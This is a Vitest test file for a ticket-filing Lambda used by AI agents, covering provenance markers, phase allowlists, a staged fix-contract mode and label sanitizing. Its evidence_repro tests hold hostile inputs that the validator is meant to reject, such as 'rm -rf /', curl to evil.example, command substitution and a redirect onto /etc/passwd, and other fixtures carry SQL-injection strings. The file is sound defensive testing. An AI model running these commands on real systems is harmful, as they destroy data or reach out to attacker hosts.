import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

/**
 * TEAM-3619 D4c — create_ticket's spawnedBy/phase pass-through.
 *
 * The QA verifier and code reviewer file fix tickets through this Lambda; the
 * marker they pass is what makes the run's completion re-verify (completion.mjs
 * condition iii) refuse to close while a fix is open. The contract under test:
 *   - a VALID marker is persisted in the exact shape completion.mjs reads
 *     (spawnedBy.{kind, originId}) + the phase stamp;
 *   - an UNKNOWN kind is rejected outright (no junk on the record, no ticket
 *     minted) — agents can't scribble arbitrary provenance;
 *   - ABSENT fields leave the record byte-for-byte as it was before (backward
 *     compatible), and stray keys inside a valid marker are dropped.
 */

const h = vi.hoisted(() => ({
  state: {
    puts: /** @type {any[]} */ ([]),
    counter: 0,
    // TEAM-3686 F2: S3 config objects by key (config/agents.json, …). With no
    // ARTIFACT_BUCKET (the default here) the lambda never reads S3 and falls
    // back to the hardcoded roster/phase sets, matching the pre-existing tests.
    s3: /** @type {Record<string, unknown>} */ ({}),
    // TEAM-4122 FR-5: labels_add writes (one conditional UpdateCommand per
    // label), the rows GetCommand can see, and the labels whose conditional
    // write should fail — the "already present OR no such ticket" branch.
    labelUpdates: /** @type {any[]} */ ([]),
    items: /** @type {Record<string, any>} */ ({}),
    condFail: /** @type {string[]} */ ([]),
  },
}));

vi.mock("@aws-sdk/client-dynamodb", () => ({ DynamoDBClient: class {} }));
vi.mock("@aws-sdk/client-s3", () => ({
  S3Client: class {
    async send(cmd) {
      const key = cmd.input.Key;
      if (!(key in h.state.s3)) throw new Error(`NoSuchKey: ${key}`);
      const body = h.state.s3[key];
      return { Body: { transformToString: async () => JSON.stringify(body) } };
    }
  },
  GetObjectCommand: class { constructor(i) { this.input = i; } },
}));
vi.mock("@aws-sdk/lib-dynamodb", () => {
  class PutCommand { constructor(input) { this.input = input; } }
  class GetCommand { constructor(input) { this.input = input; } }
  class UpdateCommand { constructor(input) { this.input = input; } }
  class QueryCommand { constructor(input) { this.input = input; } }
  class ScanCommand { constructor(input) { this.input = input; } }
  return {
    PutCommand, GetCommand, UpdateCommand, QueryCommand, ScanCommand,
    DynamoDBDocumentClient: {
      from: () => ({
        send: async (cmd) => {
          const name = cmd.constructor.name;
          if (name === "UpdateCommand") {
            const label = cmd.input.ExpressionAttributeValues?.[":label"];
            if (label !== undefined) {
              // A labels_add conditional append, not nextTicketId's counter bump.
              h.state.labelUpdates.push(cmd.input);
              if (h.state.condFail.includes(label)) {
                const err = new Error("The conditional request failed");
                err.name = "ConditionalCheckFailedException";
                throw err;
              }
              return {};
            }
            h.state.counter += 1;
            return { Attributes: { nextNum: h.state.counter } };
          }
          if (name === "GetCommand") return { Item: h.state.items[cmd.input.Key.ticketId] };
          if (name === "PutCommand") { h.state.puts.push(cmd.input.Item); return {}; }
          return {};
        },
      }),
    },
  };
});

let handler;

async function create(args) {
  return handler({ name: "Tickets___create_ticket", arguments: args });
}

beforeEach(async () => {
  h.state.puts.length = 0;
  h.state.counter = 0;
  h.state.s3 = {};
  h.state.labelUpdates.length = 0;
  h.state.condFail.length = 0;
  h.state.items = {};
  delete process.env.ARTIFACT_BUCKET;
  vi.resetModules();
  ({ handler } = await import("./index.mjs"));
});

const BASE = { summary: "Fix null check", assignee: "agentcore_hub_backend_dev" };

describe("create_ticket — spawnedBy/phase pass-through (D4c)", () => {
  it("persists a valid qa_fix marker + phase in the shape completion.mjs reads", async () => {
    await create({ ...BASE, spawned_by: { kind: "qa_fix", qaTicketId: "TEAM-42" }, phase: "development" });
    expect(h.state.puts.length).toBe(1);
    const item = h.state.puts[0];
    expect(item.spawnedBy).toEqual({ kind: "qa_fix", qaTicketId: "TEAM-42" });
    expect(item.phase).toBe("development");
  });

  it("rejects an unknown kind and mints NO ticket", async () => {
    const res = await create({ ...BASE, spawned_by: { kind: "bogus_fix", qaTicketId: "TEAM-42" } });
    expect(res.content[0].text).toMatch(/^Error:/);
    expect(res.content[0].text).toMatch(/spawned_by\.kind/);
    expect(h.state.puts.length).toBe(0); // validation precedes nextTicketId/Put
  });

  it("writes no spawnedBy/phase when absent (backward compatible)", async () => {
    await create({ ...BASE });
    expect(h.state.puts.length).toBe(1);
    const item = h.state.puts[0];
    expect("spawnedBy" in item).toBe(false);
    expect("phase" in item).toBe(false);
  });

  it("drops stray/ill-typed keys inside a valid marker", async () => {
    await create({
      ...BASE,
      spawned_by: { kind: "codex_fix", codexTicketId: "TEAM-9", gateTicketId: 123, evil: "x" },
    });
    const item = h.state.puts[0];
    expect(item.spawnedBy).toEqual({ kind: "codex_fix", codexTicketId: "TEAM-9" });
  });
});

/**
 * TEAM-3686 F2 — the fix-ticket phase allowlist. completion.mjs's open-fix
 * gate matches fix tickets per-phase, so a fix stamped with an unknown phase
 * is invisible to every required phase's check and the run can complete with
 * the fix still open. Unknown phase on a fix-kind ticket → reject, listing the
 * legal set; non-fix tickets and absent phases keep their existing behavior.
 */
describe("create_ticket — fix-ticket phase allowlist (TEAM-3686 F2)", () => {
  const FIX = { spawned_by: { kind: "qa_fix", qaTicketId: "TEAM-42" } };

  it("rejects a fix-kind ticket with an unknown phase and mints NO ticket", async () => {
    const res = await create({ ...BASE, ...FIX, phase: "zz_nonexistent" });
    expect(res.content[0].text).toMatch(/^Error:/);
    expect(res.content[0].text).toContain('"zz_nonexistent"');
    // The error lists the valid phases (fallback set here — no ARTIFACT_BUCKET).
    expect(res.content[0].text).toContain("Valid phases:");
    expect(res.content[0].text).toContain("development");
    expect(res.content[0].text).toContain("verification");
    expect(h.state.puts.length).toBe(0);
  });

  it("accepts a fix-kind ticket with a known phase and stores it", async () => {
    await create({ ...BASE, ...FIX, phase: "verification" });
    expect(h.state.puts.length).toBe(1);
    expect(h.state.puts[0].phase).toBe("verification");
    expect(h.state.puts[0].spawnedBy).toEqual({ kind: "qa_fix", qaTicketId: "TEAM-42" });
  });

  it("leaves non-fix tickets unaffected — arbitrary phase still stored as-is", async () => {
    await create({ ...BASE, phase: "zz_custom" });
    expect(h.state.puts.length).toBe(1);
    expect(h.state.puts[0].phase).toBe("zz_custom");
  });

  it("a fix-kind ticket with no phase keeps the existing fallback (no stamp written)", async () => {
    await create({ ...BASE, ...FIX });
    expect(h.state.puts.length).toBe(1);
    expect("phase" in h.state.puts[0]).toBe(false);
    expect(h.state.puts[0].spawnedBy).toEqual({ kind: "qa_fix", qaTicketId: "TEAM-42" });
  });

  describe("with S3 config (ARTIFACT_BUCKET set)", () => {
    beforeEach(async () => {
      process.env.ARTIFACT_BUCKET = "test-bucket";
      h.state.s3 = {
        "config/agents.json": {
          agents: [{ agentId: "agentcore_hub_backend_dev", phase: "development" }],
        },
        "config/workflows.json": {
          workflows: [
            {
              id: "marketing",
              phases: [{ agentPhase: "generation" }],
              completionRequiresAgentPhases: ["scheduling"],
            },
          ],
        },
      };
      vi.resetModules();
      ({ handler } = await import("./index.mjs"));
    });

    afterEach(() => {
      delete process.env.ARTIFACT_BUCKET;
    });

    it("derives the valid set from the same configs the orchestrator reads", async () => {
      // roster phase (agents.json)
      await create({ ...BASE, ...FIX, phase: "development" });
      // def agentPhase + completionRequiresAgentPhases (workflows.json)
      await create({ ...BASE, ...FIX, phase: "generation" });
      await create({ ...BASE, ...FIX, phase: "scheduling" });
      expect(h.state.puts.map((p) => p.phase)).toEqual(["development", "generation", "scheduling"]);
    });

    it("rejects a phase outside the config-derived set, listing it", async () => {
      const res = await create({ ...BASE, ...FIX, phase: "ship" });
      expect(res.content[0].text).toMatch(/^Error:/);
      expect(res.content[0].text).toContain("development, generation, scheduling");
      expect(h.state.puts.length).toBe(0);
    });
  });
});

/**
 * TEAM-4121 FR-8 — FIX_TICKET_CONTRACT off | shadow | enforce.
 *
 * The contract is what makes a fix ticket actionable by someone other than its
 * author (invariant + evidence + citation + lineage). The rollout is staged, and
 * each stage has a distinct, testable promise:
 *
 *   off      — the fix_contract argument is ignored ENTIRELY. Nothing validated,
 *              nothing persisted, no new keys on the record or the result. A
 *              deploy that doesn't set the flag behaves exactly as before.
 *   shadow   — validate, ACCEPT anyway, and persist the partial contract plus a
 *              `warnings` list naming the missing/invalid fields, so the
 *              incomplete tickets are findable BEFORE enforce is switched on.
 *   enforce  — refuse an incomplete contract and mint NOTHING (the id counter is
 *              not even bumped), with an error the agent can act on.
 *
 * The mode is snapshotted at module load, so each describe re-imports index.mjs
 * with its own FIX_TICKET_CONTRACT (same shape as the ARTIFACT_BUCKET describe).
 */
describe("create_ticket — fix contract (TEAM-4121 FR-8)", () => {
  /** Re-import index.mjs with a given FIX_TICKET_CONTRACT value. */
  async function load(mode) {
    if (mode === undefined) delete process.env.FIX_TICKET_CONTRACT;
    else process.env.FIX_TICKET_CONTRACT = mode;
    h.state.puts.length = 0;
    h.state.counter = 0;
    vi.resetModules();
    ({ handler } = await import("./index.mjs"));
  }

  afterEach(() => {
    delete process.env.FIX_TICKET_CONTRACT;
  });

  // A qa_fix marker with a well-shaped origin id (F12) — the lineage the cap counts.
  const FIX = { spawned_by: { kind: "qa_fix", qaTicketId: "TEAM-42" } };
  // A contract that satisfies every rule for a qa_fix.
  const COMPLETE = {
    invariant: "login returns 401 for an expired token instead of 500",
    evidence_source: "unit",
    evidence_repro: "npm test -- auth.spec.ts",
    cited_location: "src/auth.ts:88, src/auth.ts:120-134",
    sibling_scope: "none",
  };

  describe("off (flag unset) — the fields are ignored entirely", () => {
    beforeEach(async () => { await load(undefined); });

    it("ignores fix_contract completely: no fixContract on the item, no warning", async () => {
      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
      expect(h.state.puts.length).toBe(1);
      const item = h.state.puts[0];
      expect("fixContract" in item).toBe(false);
      expect("warning" in res).toBe(false);
      expect("fix_contract" in res.ticket).toBe(false);
    });

    it("an INCOMPLETE contract is not even looked at — the ticket is filed silently", async () => {
      const res = await create({ ...BASE, ...FIX, fix_contract: { invariant: "" } });
      expect(h.state.puts.length).toBe(1);
      expect("fixContract" in h.state.puts[0]).toBe(false);
      expect("warning" in res).toBe(false);
    });

    it("the persisted item is byte-identical to the same ticket filed with no contract at all", async () => {
      await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
      await create({ ...BASE, ...FIX, phase: "verification" });
      expect(h.state.puts.length).toBe(2);
      const [withContract, without] = h.state.puts;
      // Only the per-ticket identity/timestamps may differ.
      const stable = (o) => ({ ...o, ticketId: "X", createdAt: "T", updatedAt: "T" });
      expect(stable(withContract)).toEqual(stable(without));
    });
  });

  describe("shadow — accept, but record what was missing", () => {
    beforeEach(async () => { await load("shadow"); });

    it("files an incomplete fix ticket and lists the missing fields in warnings + the result", async () => {
      const res = await create({ ...BASE, ...FIX, phase: "verification" });
      expect(h.state.puts.length).toBe(1);
      const item = h.state.puts[0];
      // qa_fix requires a citation, so all three of these are missing.
      expect(item.fixContract).toEqual({
        version: 1,
        warnings: ["invariant", "evidence_source", "cited_location"],
      });
      expect(res.warning).toBe(
        "WARNING: fix contract incomplete (missing: invariant, evidence_source, cited_location)"
      );
      // The ticket echo carries it too — the agent reads that, not the DDB item.
      expect(res.ticket.fix_contract).toEqual(item.fixContract);
    });

    it("keeps the fields that DID parse alongside the warnings", async () => {
      await create({ ...BASE, ...FIX, fix_contract: { invariant: "the retry budget is never negative" } });
      expect(h.state.puts[0].fixContract).toEqual({
        version: 1,
        invariant: "the retry budget is never negative",
        evidenceSource: null,
        evidenceRepro: null,
        citedLocation: [],
        siblingScope: null,
        warnings: ["evidence_source", "cited_location"],
      });
    });

    it("a COMPLETE contract is persisted with no warnings and no advisory", async () => {
      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
      expect(h.state.puts[0].fixContract).toEqual({
        version: 1,
        invariant: COMPLETE.invariant,
        evidenceSource: "unit",
        evidenceRepro: "npm test -- auth.spec.ts",
        citedLocation: ["src/auth.ts:88", "src/auth.ts:120-134"],
        siblingScope: "none",
      });
      expect("warnings" in h.state.puts[0].fixContract).toBe(false);
      expect("warning" in res).toBe(false);
    });

    it("a garbage FIX_TICKET_CONTRACT value coerces to SHADOW, not off", async () => {
      // The fail-safe direction is the INVERSE of the ship/gate guards: refusing
      // to file fix tickets because an env var was typo'd would wedge the run,
      // so an unrecognized value validates + accepts rather than going dark.
      await load("on");
      const res = await create({ ...BASE, ...FIX });
      expect(h.state.puts.length).toBe(1);
      expect(h.state.puts[0].fixContract.warnings).toContain("invariant");
      expect(res.warning).toMatch(/^WARNING: fix contract incomplete/);
    });

    it("a PLAIN (non-fix) ticket is never subject to the contract, even with fix_contract set", async () => {
      const res = await create({ ...BASE, fix_contract: { invariant: "" } });
      expect(h.state.puts.length).toBe(1);
      expect("fixContract" in h.state.puts[0]).toBe(false);
      expect("warning" in res).toBe(false);
    });
  });

  describe("enforce — an incomplete contract mints nothing", () => {
    beforeEach(async () => { await load("enforce"); });

    it("rejects a missing invariant with the actionable error and writes NO ticket", async () => {
      const res = await create({
        ...BASE, ...FIX, phase: "verification",
        fix_contract: { ...COMPLETE, invariant: "   " },
      });
      expect(res.content[0].text).toBe(
        "Error: 'invariant' is required on a fix ticket (missing: invariant)"
      );
      expect(h.state.puts.length).toBe(0);
      expect(h.state.counter).toBe(0); // the id counter isn't even bumped
    });

    it("rejects an evidence_source outside static|unit|live", async () => {
      const res = await create({ ...BASE, ...FIX, fix_contract: { ...COMPLETE, evidence_source: "vibes" } });
      expect(res.content[0].text).toBe(
        "Error: 'evidence_source' is required on a fix ticket (invalid: evidence_source)"
      );
      expect(h.state.puts.length).toBe(0);
    });

    it("rejects a malformed origin id — a fix with no usable lineage (F12)", async () => {
      const res = await create({
        ...BASE,
        spawned_by: { kind: "qa_fix", qaTicketId: 'TEAM-42" OR project = OTHER' },
        fix_contract: COMPLETE,
      });
      expect(res.content[0].text).toBe(
        "Error: 'spawned_by_origin_id' is required on a fix ticket (missing: spawned_by_origin_id)"
      );
      expect(h.state.puts.length).toBe(0);
    });

    it("reports missing AND invalid together, naming the first problem", async () => {
      const res = await create({
        ...BASE,
        ...FIX,
        fix_contract: { evidence_source: "nope", cited_location: "src/auth.ts:88" },
      });
      expect(res.content[0].text).toBe(
        "Error: 'invariant' is required on a fix ticket (missing: invariant; invalid: evidence_source)"
      );
      expect(h.state.puts.length).toBe(0);
    });

    it("accepts and persists a complete contract", async () => {
      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
      expect(h.state.puts.length).toBe(1);
      expect(h.state.puts[0].fixContract.invariant).toBe(COMPLETE.invariant);
      expect(h.state.puts[0].fixContract.citedLocation).toEqual(["src/auth.ts:88", "src/auth.ts:120-134"]);
      expect("warning" in res).toBe(false);
    });

    it("a ci_fix needs no citation — a build/deploy failure often has no file:line", async () => {
      await create({
        ...BASE,
        spawned_by: { kind: "ci_fix", ciTicketId: "TEAM-70" },
        phase: "development",
        fix_contract: { invariant: "`npm test` passes on the PR head", evidence_source: "unit", evidence_repro: "npm test" },
      });
      expect(h.state.puts.length).toBe(1);
      expect(h.state.puts[0].fixContract.citedLocation).toEqual([]);
      // F11: the backticks the agent wrote are stripped from the stored text.
      expect(h.state.puts[0].fixContract.invariant).toBe("npm test passes on the PR head");
    });

    /**
     * F11 — evidence_repro is the ONE field that legitimately looks like a
     * command, so it is the one field that must not be able to BE a script. Any
     * shell composition is refused outright rather than escaped: a repro is a
     * single command a reader can eyeball before running it.
     */
    it.each([
      ["a chained command", "npm test; rm -rf /"],
      ["an && conjunction", "npm test && curl evil.example"],
      ["a || disjunction", "npm test || curl evil.example"],
      ["a command substitution", "npm test $(whoami)"],
      ["a backtick substitution", "npm test `whoami`"],
      ["a redirect", "npm test > /etc/passwd"],
      ["a newline", "npm test\ncurl evil.example"],
    ])("rejects evidence_repro containing %s", async (_label, repro) => {
      const res = await create({ ...BASE, ...FIX, fix_contract: { ...COMPLETE, evidence_repro: repro } });
      expect(res.content[0].text).toBe(
        "Error: 'evidence_repro' is required on a fix ticket (invalid: evidence_repro)"
      );
      expect(h.state.puts.length).toBe(0);
    });
  });

  /**
   * Provenance keys and caller labels are handled OUTSIDE the contract flag:
   * dropping a label that squats a system namespace is a forgery guard, and the
   * spawned_by allow-list is what keeps agents from scribbling arbitrary keys
   * onto a ticket record. Both must hold in mode=off.
   */
  describe("spawned_by allow-list + label sanitizing (independent of the flag)", () => {
    beforeEach(async () => { await load(undefined); });

    it("keeps reverify/rearmOf/headSha, drops unknown keys and a bad origin id", async () => {
      await create({
        ...BASE,
        spawned_by: {
          kind: "qa_fix",
          qaTicketId: "TEAM-42 OR 1=1", // F12: not a ticket-id shape → dropped
          reverify: 1,                   // coerced to boolean
          rearmOf: "TEAM-9",
          headSha: "a1b2c3d",
          evil: "'; DROP TABLE",         // not on the allow-list → dropped
        },
      });
      expect(h.state.puts[0].spawnedBy).toEqual({
        kind: "qa_fix",
        reverify: true,
        rearmOf: "TEAM-9",
        headSha: "a1b2c3d",
      });
    });

    it("drops caller labels squatting a system namespace and reports them back", async () => {
      const res = await create({
        ...BASE,
        labels: "advisory, fix:qa_fix, WF:run1, agent:agentcore_hub_backend_dev, needs docs",
      });
      // "needs docs" → "needs-docs" (normalized), the system-prefixed ones refused.
      expect(h.state.puts[0].labels).toEqual(["advisory", "needs-docs"]);
      expect(res.droppedLabels).toEqual(["fix:qa_fix", "wf:run1", "agent:agentcore_hub_backend_dev"]);
      expect(res.ticket.labels).toEqual(["advisory", "needs-docs"]);
    });

    it("no labels argument → no labels key and no droppedLabels (backward compatible)", async () => {
      const res = await create({ ...BASE });
      expect("labels" in h.state.puts[0]).toBe(false);
      expect("droppedLabels" in res).toBe(false);
    });
  });
});

/**
 * TEAM-4122 FR-5 — `Tickets___labels_add`, invoked with the EXACT envelope the
 * orchestrator sends (`{ tool_name, parameters }`, both `ticket_id` and
 * `issue_key` spelled out) when a run is CI-uncertifiable. The same op name and
 * the same params must work on the jira Lambda — index.test.mjs there asserts
 * the twin — because the orchestrator does not know which provider is deployed.
 *
 * The invariant under test is ADDITIVITY: this is the DynamoDB stand-in for
 * Jira's `update: { labels: [{ add }] }`, so it must be a conditional
 * `list_append` per label, never a whole-list SET (which would silently drop
 * `human-review` / `reviewer:*` labels another writer put there).
 */
describe("labels_add — the op name + envelope the orchestrator sends (TEAM-4122 FR-5)", () => {
  const invoke = (parameters) => handler({ tool_name: "Tickets___labels_add", parameters });

  it("appends ci:uncertifiable additively and reports it added", async () => {
    const res = await invoke({ ticket_id: "EPIC-1", issue_key: "EPIC-1", labels: ["ci:uncertifiable"] });

    expect(res).toEqual({ key: "EPIC-1", status: "labels_added", added: ["ci:uncertifiable"], alreadyPresent: [] });
    expect(res.error).toBeUndefined(); // NOT the unknown-tool envelope
    expect(h.state.labelUpdates).toHaveLength(1);
    const u = h.state.labelUpdates[0];
    expect(u.Key).toEqual({ ticketId: "EPIC-1" });
    expect(u.UpdateExpression).toContain("list_append");
    expect(u.UpdateExpression).not.toMatch(/SET #l = :l\b/); // never a whole-list replace
    expect(u.ExpressionAttributeValues[":one"]).toEqual(["ci:uncertifiable"]);
    // attribute_exists keeps a typo'd key from CREATING a row (Update upserts).
    expect(u.ConditionExpression).toContain("attribute_exists(ticketId)");
    expect(u.ConditionExpression).toContain("NOT contains(#l, :label)");
  });

  it("the label is legal as sent: the system-namespace form survives verbatim", async () => {
    const res = await invoke({ ticket_id: "EPIC-1", labels: ["ci:uncertifiable"] });
    // `ci:` is a reserved prefix a CALLER may not use, but the system's own
    // labels_add path must still be able to write it.
    expect(res.added).toEqual(["ci:uncertifiable"]);
    expect(res.dropped).toBeUndefined();
    // No whitespace: jira rejects it outright, so the two providers must agree.
    expect(res.added[0]).not.toMatch(/\s/);
  });

  it("ticket_id alone is accepted (issue_key is the jira spelling)", async () => {
    const res = await invoke({ ticket_id: "EPIC-9", labels: ["ci:uncertifiable"] });
    expect(res.key).toBe("EPIC-9");
    expect(h.state.labelUpdates[0].Key).toEqual({ ticketId: "EPIC-9" });
  });

  it("re-labelling an already-labelled epic is idempotent, not an error", async () => {
    h.state.items["EPIC-1"] = { ticketId: "EPIC-1", labels: ["ci:uncertifiable"] };
    h.state.condFail.push("ci:uncertifiable");

    const res = await invoke({ ticket_id: "EPIC-1", labels: ["ci:uncertifiable"] });

    expect(res.status).toBe("labels_added");
    expect(res.added).toEqual([]);
    expect(res.alreadyPresent).toEqual(["ci:uncertifiable"]);
  });

  it("a ticket that does not exist is an ERROR, not a silent success", async () => {
    h.state.condFail.push("ci:uncertifiable"); // no row → the same conditional failure
    const res = await invoke({ ticket_id: "NOPE-1", labels: ["ci:uncertifiable"] });
    expect(res.content[0].text).toBe("Error: ticket NOPE-1 not found");
  });
});
